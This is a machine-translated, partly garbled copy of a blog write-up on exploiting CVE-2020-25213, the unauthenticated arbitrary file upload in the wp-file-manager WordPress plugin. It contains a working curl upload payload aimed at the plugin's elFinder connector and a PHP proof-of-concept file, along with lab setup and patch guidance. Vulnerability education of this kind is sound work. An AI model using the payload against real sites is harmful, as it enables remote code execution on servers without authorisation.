<html>
<head>
<title>Exploiting CVE-2020–25213: wp-file-manager wordpress plugin (&lt;6.9) for unauthenticated arbitrary file upload</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">剥削CVE-2020–25213:WP-文件-管理器wordpress插件(&lt;6.9) for unauthenticated arbitrary file upload</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/exploiting-cve-2020-25213-wp-file-manager-wordpress-plugin-6-9-3f79241f0cd8?source=collection_archive---------0-----------------------#2020-10-12">https://infosecwriteups.com/exploiting-cve-2020-25213-wp-file-manager-wordpress-plugin-6-9-3f79241f0cd8?source=collection_archive---------0-----------------------#2020-10-12</a></blockquote><div><div class="fc ie if ig ih ii"/><div class="ij ik il im in"><div class=""/><figure class="gl gn jo jp jq jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi jn"><img src="../Images/99267f2a0aef0e2e7420bed17c07f4b3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*av8FegyKYaNbVpysB2Px_A.png"/></div></div></figure><p id="ab6f" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">Hello everyone!!</p><p id="067c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> Mansoor(@time4ster) </strong>在此。这是我对信息安全社区的第一次贡献，我希望你会喜欢这篇文章。</p><p id="9ff0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">对于漏洞代码，你可以直接访问我的github <a class="ae kw" href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213" rel="noopener ugc nofollow" target="_blank">回购</a>。</p><p id="c0ae" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">T5】免责声明T7】</strong></p><p id="8029" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我没有发现这个漏洞&amp;也没有从这个CVE身上得到任何荣誉。我只是在分析了各种博客(如<a class="ae kw" href="https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/" rel="noopener ugc nofollow" target="_blank"> wordfence </a>、<a class="ae kw" href="https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/" rel="noopener ugc nofollow" target="_blank"> seravo </a>)上的描述后创建了这个漏洞，其座右铭是让读者了解如何通过分析漏洞的描述来创建POC。</p><p id="4a00" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我对使用该漏洞给组织造成的任何损失不负任何责任&amp;我建议读者在没有组织书面同意的情况下不要利用该漏洞，因为它可能会使组织暴露于其他黑客的攻击之下。</p><h1 id="e2a3" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">关于漏洞:</h1><p id="baaf" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated"><a class="ae kw" href="https://nvd.nist.gov/vuln/detail/CVE-2020-25213" rel="noopener ugc nofollow" target="_blank"><strong class="ka ir">CVE-2020–25213</strong></a>:WordPress 6.9之前的文件管理器(wp-file-manager)插件允许远程攻击者上传并执行任意PHP代码，因为它将一个不安全的示例elFinder连接器文件重命名为具有。php扩展。例如，这使得攻击者能够运行elFinder upload(或mkfile和put)命令，将PHP代码写入WP-content/plugins/WP-file-manager/lib/files/目录。这是2020年8月和9月在野外开采的。</p><p id="5e6c" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir"> CVSS: </strong> <strong class="ka ir"> 9.8 </strong></p><h1 id="9d40" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">发生了什么事？</h1><p id="c4a0" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">在8月的最后一周，该漏洞开始作为零日被利用。9月1日，插件开发者修补了漏洞&amp;发布了版本<strong class="ka ir"> 6.9。</strong>补丁发布后，各种组织如<a class="ae kw" href="https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/" rel="noopener ugc nofollow" target="_blank"> wordfence </a>、<a class="ae kw" href="https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/" rel="noopener ugc nofollow" target="_blank"> seravo </a> &amp;还有一些组织发表了博客，描述wp-file-manager zero day &amp;如何在野外被利用的细节。</p><h1 id="fc99" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">设置环境</h1><ol class=""><li id="3135" class="mb mc iq ka b kb lw kf lx kj md kn me kr mf kv mg mh mi mj bi translated">在虚拟机(或本地主机)上安装wordpress。在ubuntu上安装wordpress可以参考这个<a class="ae kw" href="https://ubuntu.com/tutorials/install-and-configure-wordpress#1-overview" rel="noopener ugc nofollow" target="_blank">站点</a>。</li></ol><p id="3270" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">2.从<a class="ae kw" href="https://downloads.wordpress.org/plugin/wp-file-manager.6.0.zip" rel="noopener ugc nofollow" target="_blank">这里</a>下载并安装易受攻击的WP-文件管理器插件(版本6.0)。</p><p id="24f9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">3.安装El finder[可选]</p><h1 id="24f7" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">创建漏洞</h1><p id="4213" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">wp-file-manager插件使用的<strong class="ka ir"> elFinder的</strong>库的<em class="kx">/WP-content/plugins/WP-file-manager/lib/PHP/connector . minimal . PHP</em>文件负责上传任何给定扩展名的任意文件(未经验证)。</p><p id="92df" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了理解elFinder如何上传文件，让我们首先在localhost上下载并配置elFinder。</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="64d1" class="mt kz iq mp b gy mu mv l mw mx">git clone <a class="ae kw" href="https://github.com/Studio-42/elFinder.git" rel="noopener ugc nofollow" target="_blank">https://github.com/Studio-42/elFinder.git</a><br/>mv elFinder/php/connector.minimal.php-dist elFinder/php/connector.minimal.php<br/>chown -R www-data:www-data elFinder/</span></pre><p id="148a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在访问<em class="kx"> /elFinder.html </em>时，显示文件管理器菜单，包括文件上传选项:</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/b220696cc14ffdddc898058ac5c8c0f0.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*MiVJEp1D2QdjLNZuL6zIbg.png"/></div></div></figure><p id="7d24" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在，我们将上传任何图像文件，并在burp套件中监控请求。</p><p id="1213" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">在burp suite中，POST请求被发送到<em class="kx">/El finder/PHP/connector . minimal . PHP</em>&amp;作为响应，位置被反映为文件上传的位置。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/c39338d8f79270399bc4011f06133946.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lmjHy0b1_HVN2ZaWsdgGtQ.png"/></div></div></figure><p id="91b1" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">现在我们将把<em class="kx">/El finder/PHP/connector . minimal . PHP</em>替换为<em class="kx">/WordPress/WP-content/plugins/WP-file-manager/lib/PHP/connector . minimal . PHP</em>【我们的wordress站点中的插件位置】&amp;看看我们是否能够上传文件？</p><p id="b82a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">我们能够上传文件太好了！！这意味着现在我们可以上传任意扩展名的任意文件。</p><p id="e1b8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">为了上传php文件，在上面的请求中(改变URL之后),我们需要将文件名改为poc_PHPinfo.php，其内容为</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="5f1d" class="mt kz iq mp b gy mu mv l mw mx">&lt;?php <br/>echo “POC By Time4ster”;<br/>phpinfo(); <br/>?&gt;</span></pre><p id="1f16" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">&amp;耶！！PHP文件被上传，URL也显示在文件上传的响应中。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi mz"><img src="../Images/c318dd0bc407130bc17e69bf08bb8ab8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kVts0aAQGcXmtV-B2QPSlA.png"/></div></div></figure><p id="b8c8" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">上传的文件可以在:<a class="ae kw" href="http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/files/poc_PHPinfo.php" rel="noopener ugc nofollow" target="_blank">http://192 . 168 . 1 . 54/WordPress/WP-content/plugins/WP-file-manager/lib/files/POC _ phpinfo . PHP</a></p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi my"><img src="../Images/94270b3a6e8392d6fec37e489dfd3c02.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*CcUHd-WQrNAKepfIZpvQLw.png"/></div></div></figure><p id="3dfb" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">上述打嗝要求的等效卷曲有效载荷:</p><pre class="mk ml mm mn gt mo mp mq mr aw ms bi"><span id="daa0" class="mt kz iq mp b gy mu mv l mw mx">curl -ks — max-time 5 — user-agent “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.90 Safari/537.36” -F “reqid=17457a1fe6959” -F “cmd=upload” -F “target=l1_Lw” -F “mtime[]=1576045135” -F “upload[]=@//root/poc_PHPinfo.php” “<a class="ae kw" href="http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php" rel="noopener ugc nofollow" target="_blank">http://192.168.1.54/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php</a>"</span></pre><p id="efb3" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">这里的<em class="kx"> /root/poc_PHPinfo.php </em>文件可以替换为我们想要上传到服务器上的任意文件。</p><p id="dba9" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><strong class="ka ir">注意:</strong>有时候php文件会被防火墙拦截，所以最好先上传txt文件来确认漏洞。</p><p id="2f83" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">还要注意，上传的文件可以被任何未经认证的用户访问(在php中为&amp; executed ),所以上传文件时要小心。</p><h1 id="2ca8" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">剥削</h1><p id="a5eb" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">我创建的Bash漏洞利用代码:</p><p id="2c29" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated"><a class="ae kw" href="https://github.com/mansoorr123/wp-file-manager-CVE-2020-25213" rel="noopener ugc nofollow" target="_blank">https://github . com/manso or 123/WP-file-manager-CVE-2020-25213</a></p><h1 id="d6bb" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">影响</h1><p id="aef9" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">利用此漏洞，攻击者可以上传php文件并在目标上执行文件，而无需任何身份验证，从而导致机器完全受损。(CVSS: 9.8分)。</p><p id="ad30" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">wp-file-manager有600，000多个活跃安装，其中只有53.3%的用户在撰写本文时升级到了最新的插件版本6.9。</p><figure class="mk ml mm mn gt jr gh gi paragraph-image"><div role="button" tabindex="0" class="js jt di ju bf jv"><div class="gh gi na"><img src="../Images/d8ae0b9ca0ae186846605c7d245dace9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*WeFATUXR4bdSOCSL6e4MBQ.png"/></div></div><figcaption class="nb nc gj gh gi nd ne bd b be z dk translated">来源:https://wordpress.org/plugins/wp-file-manager/advanced/</figcaption></figure><h1 id="f7e4" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">修补</h1><p id="7944" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">从<a class="ae kw" href="https://wordpress.org/plugins/wp-file-manager/" rel="noopener ugc nofollow" target="_blank">厂商网站</a>升级到wp-file-manager的最新版本(版本≥6.9)。</p><h1 id="3e3f" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">时间表</h1><p id="c873" class="pw-post-body-paragraph jy jz iq ka b kb lw kd ke kf lx kh ki kj ly kl km kn lz kp kq kr ma kt ku kv ij bi translated">上周8月:漏洞作为零日开始被利用。</p><p id="d085" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">9月1日:厂商发布补丁。</p><p id="d11a" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">9月2日:各种博客发布描述这个零日&amp;漏洞的细节。</p><p id="7f3e" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">9月4日:在研究了漏洞之后，创建了我的bash漏洞利用脚本。</p><p id="cc35" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">9月9日:CVE 2020–25213被分配到这个零日利用。</p><h1 id="78de" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">信用</h1><ol class=""><li id="0422" class="mb mc iq ka b kb lw kf lx kj md kn me kr mf kv mg mh mi mj bi translated"><a class="ae kw" href="https://www.wordfence.com/blog/2020/09/700000-wordpress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/" rel="noopener ugc nofollow" target="_blank">https://www . word fence . com/blog/2020/09/700000-WordPress-users-affected-by-zero-day-vulnerability-in-file-manager-plugin/</a></li><li id="c3ee" class="mb mc iq ka b kb nf kf ng kj nh kn ni kr nj kv mg mh mi mj bi translated"><a class="ae kw" href="https://seravo.com/blog/0-day-vulnerability-in-wp-file-manager/" rel="noopener ugc nofollow" target="_blank">https://seravo . com/blog/0-day-vulnerability-in-WP-file-manager/</a></li></ol><p id="eef0" class="pw-post-body-paragraph jy jz iq ka b kb kc kd ke kf kg kh ki kj kk kl km kn ko kp kq kr ks kt ku kv ij bi translated">感谢您阅读这篇文章。如果你喜欢我的报道，请点击<strong class="ka ir">👏与你的朋友分享，这将鼓励我在未来发表更多的Infosec文章。</strong></p></div></div>    
</body>
</html>